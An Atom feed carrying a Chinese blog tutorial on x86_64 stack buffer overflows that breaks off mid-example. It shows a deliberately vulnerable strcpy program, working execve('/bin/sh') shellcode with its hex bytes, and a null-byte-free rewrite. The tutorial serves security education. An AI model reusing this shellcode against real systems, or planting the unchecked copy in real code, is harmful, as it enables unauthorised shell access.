<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>清欢&#39;s Blog</title>
  
  <subtitle>一个杂乱的笔记本</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mingliangliu.com/"/>
  <updated>2019-09-16T07:55:32.407Z</updated>
  <id>https://mingliangliu.com/</id>
  
  <author>
    <name>清欢</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>缓冲区溢出（栈溢出）</title>
    <link href="https://mingliangliu.com/2019/09/04/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%EF%BC%88%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%89/"/>
    <id>https://mingliangliu.com/2019/09/04/缓冲区溢出（栈溢出）/</id>
    <published>2019-09-04T13:32:03.000Z</published>
    <updated>2019-09-16T07:55:32.407Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在现在的网络攻击中，缓冲区溢出方式的攻击占据了很大一部分，缓冲区溢出是一种非常普遍的漏洞，但同时，它也是非常危险的一种漏洞，轻则导致系统宕机，重则可导致攻击者获取系统权限，进而盗取数据，为所欲为。</p><p>其实缓冲区攻击说来也简单，请看下面一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>) <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们在对<code>argv[1]</code>进行拷贝操作时，并没对其长度进行检查，这时候攻击者便可以通过拷贝一个长度大于8的字符串来覆盖程序的返回地址，让程序转而去执行攻击代码，进而使得系统被攻击。</p><p>本篇主要讲述缓冲区溢出攻击的基本原理，我会从程序是如何利用栈这种数据结构来进行运行的开始，试着编写一个shellcode，然后用该shellcode来溢出我们的程序来进行说明。我们所要使用的系统环境为x86_64 Linux，我们还要用到gcc（v7.4.0）、gdb（v8.1.0）等工具，另外，我们还需要一点汇编语言的基础，并且我们使用AT&amp;T格式的汇编。</p><p>就我个人而言，作为一个新手，我还是比较怂来写这篇文章而言的，如果你发现又任何的错误或者不恰当的地方，欢迎指出，希望这篇文章对您有帮助。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>在现代的操作系统中，进程是一个程序的运行实体，当在操作系统中运行一个程序时，操作系统会为我们的程序创建一个进程，并给我们的程序在内存中分配运行所需的空间，这些空间被称为进程空间。进程空间主要有三部分组成：代码段，数据段和栈段。如下图所示：</p><img src="/images/缓冲区溢出1.jpg"><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是一种后入先出的数据结构，在现代的大多数编程语言中，都使用栈这种数据结构来管理过程之间的调用。那什么又是过程之间的调用呢，说白了，一个函数或者一个方法便是一个过程，而在函数或方法内部调用另外的过程和方法便是过程间的调用。我们知道，程序的代码是被加载到内存中，然后一条条（这里指汇编）来执行的，而且时不时的需要调用其他的函数。当一个调用过程调用一个被调用过程时，所要执行的代码所在的内存地址是不同的，当被调用过程执行完后，又要回到调用过程继续执行。调用过程调用被调用过程时，需要使用<code>call</code>指令，并在<code>call</code>指令后指明要调用的地址，例如<code>call 地址</code>，当被调用过程返回时，使用<code>ret</code>指令来进行返回，但是并不需要指明返回的地址。那么程序是怎么知道我们要返回到什么地方呢？这主要是栈的功劳：执行<code>call</code>指令时，程序会自动的将<code>call</code>指令的下一条指令的地址加入到栈中，我们叫做返回地址。当程序返回时，程序从栈中取出返回地址，然后使程序跳转到返回地址处继续执行。</p><p>另外，程序在调用另一个过程时需要传递的参数，以及一个过程的局部变量（包括过程中开辟的缓冲区）都要分配在栈上。可见，栈是程序运行必不可少的一种机制。</p><p>但是，聪明的你可能一想：不对，既然程序的返回地址保存在栈上，过程的参数以及局部变量也保存在栈上，我们可以在程序中操纵参数和局部变量，那么我们是否也能操作返回地址，然后直接跳转到我们想要运行的代码处呢？答案当然是肯定的。</p><h2 id="改变程序的返回地址"><a href="#改变程序的返回地址" class="headerlink" title="改变程序的返回地址"></a>改变程序的返回地址</h2><p>我们看这也一个程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">example.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> *res;</span><br><span class="line">        res = &amp;res + <span class="number">2</span>;</span><br><span class="line">        *res += <span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line">        func();</span><br><span class="line">        x = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在shell中使用如下命令编译运行一下，对于gcc编译时所用的参数，我先卖个关子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ `gcc -fno-stack-protector example.c -o example`</span><br><span class="line">$ ./example</span><br></pre></td></tr></table></figure><p>你或许会说：“哎呀呀，不用看了，这么简单，运行结果是0嘛”。但结果真的是这样嘛。其实，这个程序的运行结果是1。“什么，这怎么可能是1嘛，不得了不得了”</p><p>还记的我们提到的我们可以在程序中改变过程的返回地址吗？在<code>func</code>中，看似是对res进行了一些无意义的操作，但是这实际上是改变了<code>func</code>的返回地址，跳过了<code>x = 0</code>这条赋值命令。让我们从汇编的层面上看一下这个程序是如何执行的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ gdb gdb example</span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">...</span><br><span class="line">gdb-peda$ disassemble func </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> func:</span><br><span class="line">   0x000000000000064a &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x000000000000064b &lt;+1&gt;:mov    %rsp,%rbp</span><br><span class="line">   0x000000000000064e &lt;+4&gt;:lea    -0x8(%rbp),%rax</span><br><span class="line">   0x0000000000000652 &lt;+8&gt;:add    <span class="variable">$0x10</span>,%rax</span><br><span class="line">   0x0000000000000656 &lt;+12&gt;:mov    %rax,-0x8(%rbp)</span><br><span class="line">   ...</span><br><span class="line">   0x000000000000066e &lt;+36&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在gdb中，我们使用<code>disassemble func</code>来查看一下<code>func</code>函数的汇编代码，在这里，程序栈上的情况是这样的，其中栈的宽度为8字节：</p><img src="/images/缓冲区溢出2.jpg"><p>一看程序你也许会明白了，在4~12行（实际上这里的行应该是该条指令在该函数中第几个字节处，这里为了方便姑且就这样叫吧）程序取得<code>res</code>的地址,并将其地址加上0x10(即16)，这对应程序的<code>res = &amp;res + 2;</code>，此时<code>res</code>指向的便是返回地址所在的地址了，然后使用<code>*res += 7</code>来改变返回地址。至于为什么是加7而不是其他数，是因为我们的目的是跳过执行<code>x = 0</code>，而<code>x = 0</code>这条程序所占的字节数刚好为7个。我们使用<code>disassemble main</code>来查看一下<code>main</code>函数的汇编代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x000000000000066f &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x0000000000000670 &lt;+1&gt;:mov    %rsp,%rbp</span><br><span class="line">   0x0000000000000673 &lt;+4&gt;:sub    <span class="variable">$0x10</span>,%rsp</span><br><span class="line">   0x0000000000000677 &lt;+8&gt;:movl   <span class="variable">$0x1</span>,-0x4(%rbp)</span><br><span class="line">   0x000000000000067e &lt;+15&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000000683 &lt;+20&gt;:callq  0x64a &lt;func&gt;</span><br><span class="line">   0x0000000000000688 &lt;+25&gt;:movl   <span class="variable">$0x0</span>,-0x4(%rbp)</span><br><span class="line">   0x000000000000068f &lt;+32&gt;:mov    -0x4(%rbp),%eax</span><br><span class="line">   ...   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>上面的汇编代码中，第25行便是<code>x = 0</code>这条程序的汇编指令，我们的目的是跳过它，也就是说我们要直接执行第32行处的代码，现在返回地址是指向第25行的（还记得前面说的返回地址是<code>call</code>指令下一条指令的地址吗），为了跳过它，我们给返回地址加7。</p><h2 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h2><p>现在，我们大概了解了如何修改返回地址让程序跳转到我们指定的地方执行，但是要攻击的程序可不是我们编写的啊，我们只是知道程序的某个地方有个缓冲区可以让我们往里面写数据，我们可没有办法改变程序的代码啊。这个时候，我们就要说一说关于缓冲区的拷贝这件事了。</p><p>还记的我们开头的程序吗？这里我们为了调试起来方便，我们给它加个输出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>) <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的程序在栈上的结构大概是下面这个样子。这里将我们的栈换了个样子</p><img src="/images/缓冲区溢出3.jpg"><p>当程序对<code>argv[1]</code>进行拷贝操作时，依次将字符从低地址写向高地址。当<code>argv[1]</code>的长度小于8时，我们的缓冲区<code>buffer</code>空间足够，拷贝没有问题可以完成，但当我们的<code>argv[1]</code>的过长的话，长到将返回地址都覆盖了的话，<code>main</code>函数的返回地址就不知道返回到哪里去了。</p><p>让我们来试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fo-stack-protector  -o <span class="built_in">test</span> test.c</span><br><span class="line">$ ./<span class="built_in">test</span> hello</span><br><span class="line">hello</span><br><span class="line">$ ./<span class="built_in">test</span> helloworld</span><br><span class="line">helloworld</span><br><span class="line">$ ./<span class="built_in">test</span> helloworld123456789</span><br><span class="line">helloworld123456789</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><p>可以看到当我们给定的参数为<code>helloworld123456789</code>，我们的程序出现了段错误，也即是这时候，我们的返回地址被破环了，导致<code>main</code>函数返回时出错。这时候的栈看起来是下面这个样子的：</p><img src="/images/缓冲区溢出4.jpg"><p>对照前面的栈结构，发现<code>main</code>函数的返回地址的确被破坏了。若是我们往返回地址处覆盖一个我们想要执行的程序的地址，那是不是就可以执行我们的程序了呢？</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>那么攻击时要执行什么程序呢？一般情况下，我们想通过缓冲区溢出来获取一个shell，一旦有了shell，我们就可以“为所欲为”了，因此我们也把这种程序叫做shellcode。那么这个shellcode在哪呢，可以确定的是，系统管理员是不会在系统中留一个shellcode的，也并不会告诉你：嘿，我这里有一个shellcode，地址是xxxx，你快把返回地址给覆盖了，来着里执行吧。所以，这个shellcode还需要我们自己编写，并传到要攻击的系统上。那要传递到哪呢？缓冲区不正是一个好地方嘛。</p><p>我们知道，在冯·诺伊曼架构的计算机中，数据和代码是不加以明确区分的，也就是说，内存中某个地方的东西，它既可以看作是一个程序的数据，也可以当作代码来执行。所以，我们大概有了一个攻击思路：我们将我们的shellcode放在缓冲区中，然后通过覆盖返回地址跳转到我们shellcode处，进而执行我们的shellcode</p><p>下面，我们来讨论如何编写一个shellcode</p><p>首先，我们为了得到一个shell，需要使用第59和60号系统调用，下面是他们的系统调用表，并以C语言的方式指明了他们的参数。</p><table><thead><tr><th align="center">%rax</th><th align="center">system call</th><th align="center">%rdi</th><th align="center">%rsi</th><th align="center">%rdx</th></tr></thead><tbody><tr><td align="center">59</td><td align="center">sys_execve</td><td align="center">const char *filename</td><td align="center">const char *const argv[]</td><td align="center">const char* const envp[]</td></tr><tr><td align="center">60</td><td align="center">sys_exit</td><td align="center">int error_code</td><td align="center"></td><td align="center"></td></tr></tbody></table><p>他们分别对应C语言中的系统函数<code>int execve(const char *filename, char *const argv[ ], char *const envp[ ]);</code>和<code>exit(int error_code)</code>，<code>execve()</code>用于在一个进程中启动新的程序，它的第一个参数是指程序所在的路径，第二个参数是传递给程序的参数，数组指针argv必须以程序filename开头，NULL结尾，最后一个参数为传递程序的新环境变量。而<code>exit()</code>的参数指明它的退出代码。</p><p>下面这个C语言程序便可以获取一个shell，当在获取的shell中输入<code>exit</code>时便可退出shell，且退出代码为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，让我们从汇编的角度思考一下，该如何编写一个和上面这个程序功能相似的shellcode。</p><ol><li>首先，我们需要一个字符串”/bin/sh”，并且需要知道它的确切地址</li><li>然后，我们需要将参数传递给相应的寄存器</li><li>最后，调用系统调用。</li></ol><p>如何方便的获取到一个字符串的地址呢？一种方法是将字符串放到一个<code>call</code>指令的后面，这样，当这个<code>call</code>指令执行的时候，该字符串的首地址便被加入到栈中。 好了，我不再绕弯子了，下面给出一个shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jmp mycall</span><br><span class="line">func: pop %rbx</span><br><span class="line">mov %rbx, 0x8(%rsp)</span><br><span class="line">movb $0x0, 0x7(%rsp)</span><br><span class="line">movl $0x0, 0x10(%rsp)</span><br><span class="line">mov $59, %rax</span><br><span class="line">mov %rbx, %rdi</span><br><span class="line">lea 0x8(%rsp), %rsi</span><br><span class="line">lea 0x10(%rsp), %rdx</span><br><span class="line">syscall</span><br><span class="line">mov $60, %rax</span><br><span class="line">mov $0, %rdi</span><br><span class="line">syscall</span><br><span class="line">mycall: call func</span><br><span class="line">.string \&quot;/bin/sh\&quot;</span><br></pre></td></tr></table></figure><p>现在，我们依次看一下每一条指令的意思。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.  jmp mycall</span><br><span class="line"></span><br><span class="line">        当shellcode执行时，会先执行这一条，这会使我们的程序跳转到第14行的call指令处</span><br><span class="line"></span><br><span class="line">2.  func: pop %rbx</span><br><span class="line">        </span><br><span class="line">        我们从栈中获取返回地址，这也是字符串所在的地址</span><br><span class="line"></span><br><span class="line">3.  mov %rbx, 0x8(%rsp)</span><br><span class="line">4.  movb $0x0, 0x7(%rsp)</span><br><span class="line">5.  movl $0x0, 0x10(%rsp)</span><br><span class="line"></span><br><span class="line">        尽管我们有了字符串的地址，但是我们并没有第二个参数和第三个参数所在的地址，所以程序在栈上构造出第二个和第三个参数</span><br><span class="line"></span><br><span class="line">6.  mov $59, %rax</span><br><span class="line">7.  mov %rbx, %rdi</span><br><span class="line">8.  lea 0x8(%rsp), %rsi</span><br><span class="line">9.  lea 0x10(%rsp), %rdx</span><br><span class="line"></span><br><span class="line">        我们将参数传递给指定的寄存器</span><br><span class="line"></span><br><span class="line">10. syscall</span><br><span class="line"></span><br><span class="line">        使用syscall指令进行系统调用，这在x86 Linux中为int 0x80</span><br><span class="line"></span><br><span class="line">11. mov $60, %rax</span><br><span class="line">12. mov $0, %rdi</span><br><span class="line">13. syscall</span><br><span class="line"></span><br><span class="line">        为了使我们的shellcode在退出shell后正常退出，需要调用下exit系统调用，退出代码为0</span><br><span class="line"></span><br><span class="line">14. mycall: call func</span><br><span class="line"></span><br><span class="line">15. .string \&quot;/bin/sh\&quot;</span><br></pre></td></tr></table></figure><p>它们的执行流程如下图所示：</p><img src="/images/缓冲区溢出7.jpg"><p>现在，我们有了shellcode，我们先用C语言内联汇编的方式测试一下它是否能运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode_test.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"jmp mycall\n\t"</span></span><br><span class="line">        <span class="string">"func: pop %rbx\n\t"</span></span><br><span class="line">        <span class="string">"mov %rbx, 0x8(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"movb $0x0, 0x7(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"movl $0x0, 0x10(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"mov $59, %rax\n\t"</span></span><br><span class="line">        <span class="string">"mov %rbx, %rdi\n\t"</span></span><br><span class="line">        <span class="string">"lea 0x8(%rsp), %rsi\n\t"</span></span><br><span class="line">        <span class="string">"lea 0x10(%rsp), %rdx\n\t"</span></span><br><span class="line">        <span class="string">"syscall\n\t"</span></span><br><span class="line">        <span class="string">"mov $60, %rax\n\t"</span></span><br><span class="line">        <span class="string">"mov $0, %rdi\n\t"</span></span><br><span class="line">        <span class="string">"syscall\n\t"</span></span><br><span class="line">        <span class="string">"mycall: call func\n\t"</span></span><br><span class="line">        <span class="string">".string \"/bin/sh\""</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试着编译运行一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gcc shellcode_test.c -o shellcode_test</span><br><span class="line">$ ./shellcode_test </span><br><span class="line">sh-4.4<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>Wow，我们的shellcode完全可行，但是现在还并没有结束。众所周知，程序在内存中都是以二进制的形式保存的，我们的程序也不例外，因为我们需要将我们的shellcode传递到缓冲区中去，如果直接传递代码，那显然是不行的，我们要传递的应该是编译生成的二进制才对，这样在目标机器上直接就可以执行。现在，我们使用gdb将我们的程序转换为二进制（确切的说应该是16进制，不过都一样嘛）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ gdb gdb shellcode_test</span><br><span class="line">....</span><br><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x00000000000005fa &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x00000000000005fb &lt;+1&gt;:mov    %rsp,%rbp</span><br><span class="line">   0x00000000000005fe &lt;+4&gt;:jmp    0x639 &lt;main+63&gt;</span><br><span class="line">   0x0000000000000600 &lt;+6&gt;:pop    %rbx</span><br><span class="line">   0x0000000000000601 &lt;+7&gt;:mov    %rbx,0x8(%rsp)</span><br><span class="line">   0x0000000000000606 &lt;+12&gt;:movb   <span class="variable">$0x0</span>,0x7(%rsp)</span><br><span class="line">   0x000000000000060b &lt;+17&gt;:movl   <span class="variable">$0x0</span>,0x10(%rsp)</span><br><span class="line">   0x0000000000000613 &lt;+25&gt;:mov    <span class="variable">$0x3b</span>,%rax</span><br><span class="line">   0x000000000000061a &lt;+32&gt;:mov    %rbx,%rdi</span><br><span class="line">   0x000000000000061d &lt;+35&gt;:lea    0x8(%rsp),%rsi</span><br><span class="line">   0x0000000000000622 &lt;+40&gt;:lea    0x10(%rsp),%rdx</span><br><span class="line">   0x0000000000000627 &lt;+45&gt;:syscall </span><br><span class="line">   0x0000000000000629 &lt;+47&gt;:mov    <span class="variable">$0x3c</span>,%rax</span><br><span class="line">   0x0000000000000630 &lt;+54&gt;:mov    <span class="variable">$0x0</span>,%rdi</span><br><span class="line">   0x0000000000000637 &lt;+61&gt;:syscall </span><br><span class="line">   0x0000000000000639 &lt;+63&gt;:callq  0x600 &lt;main+6&gt;</span><br><span class="line">   0x000000000000063e &lt;+68&gt;:(bad)  </span><br><span class="line">   0x000000000000063f &lt;+69&gt;:(bad)  </span><br><span class="line">   0x0000000000000640 &lt;+70&gt;:imul   <span class="variable">$0x90006873</span>,0x2f(%rsi),%ebp</span><br><span class="line">   0x0000000000000647 &lt;+77&gt;:pop    %rbp</span><br><span class="line">   0x0000000000000648 &lt;+78&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ x /64xb main+4</span><br><span class="line">0x5fe &lt;main+4&gt;:0xeb0x390x5b0x480x890x5c0x240x08</span><br><span class="line">0x606 &lt;main+12&gt;:0xc60x440x240x070x000xc70x440x24</span><br><span class="line">0x60e &lt;main+20&gt;:0x100x000x000x000x000x480xc70xc0</span><br><span class="line">0x616 &lt;main+28&gt;:0x3b0x000x000x000x480x890xdf0x48</span><br><span class="line">0x61e &lt;main+36&gt;:0x8d0x740x240x080x480x8d0x540x24</span><br><span class="line">0x626 &lt;main+44&gt;:0x100x0f0x050x480xc70xc00x3c0x00</span><br><span class="line">0x62e &lt;main+52&gt;:0x000x000x480xc70xc70x000x000x00</span><br><span class="line">0x636 &lt;main+60&gt;:0x000x0f0x050xe80xc20xff0xff0xff</span><br></pre></td></tr></table></figure><p>可以看到，除了字符串以外，我们的程序是从第4行到第63行，由于字符串在内存中保存的是ascii码，这里也就不需要获取其二进制了。</p><p>好了，现在我们已经有了shellcode的二进制了，但是还有一个问题。可以看到，我们的程序中有0x00这种数据，由于我们的shellcode作为字符串传递到缓冲区中的，这代表的恰恰也是字符串的结束，也就是说，当我们的字符串往缓冲区拷贝的时候，当遇到0x00时，无论我们的shellcode有没有拷贝完，都会停止拷贝。我们可不想我们费尽千辛万苦写出的shellcode竟然只被拷贝的残缺不全。下面，我们改进一下我们的程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode_test1.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"jmp mycall\n\t"</span></span><br><span class="line">        <span class="string">"func: pop %rbx\n\t"</span></span><br><span class="line">        <span class="string">"mov %rbx, 0x8(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"xor %rax, %rax\n\t"</span></span><br><span class="line">        <span class="string">"movb %al, 0x7(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"movl %eax, 0x10(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"movb $0x3b, %al\n\t"</span></span><br><span class="line">        <span class="string">"mov %rbx, %rdi\n\t"</span></span><br><span class="line">        <span class="string">"lea 0x8(%rsp), %rsi\n\t"</span></span><br><span class="line">        <span class="string">"lea 0x10(%rsp), %rdx\n\t"</span></span><br><span class="line">        <span class="string">"syscall\n\t"</span></span><br><span class="line">        <span class="string">"xor %rdi, %rdi\n\t"</span></span><br><span class="line">        <span class="string">"xor %rax, %rax\n\t"</span></span><br><span class="line">        <span class="string">"movb $60, %al\n\t"</span></span><br><span class="line">        <span class="string">"syscall\n\t"</span></span><br><span class="line">        <span class="string">"mycall: call func\n\t"</span></span><br><span class="line">        <span class="string">".string \"/bin/sh\""</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对照shellcode_test.c，我们只是改变了一些赋值操作。让我们看一下效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 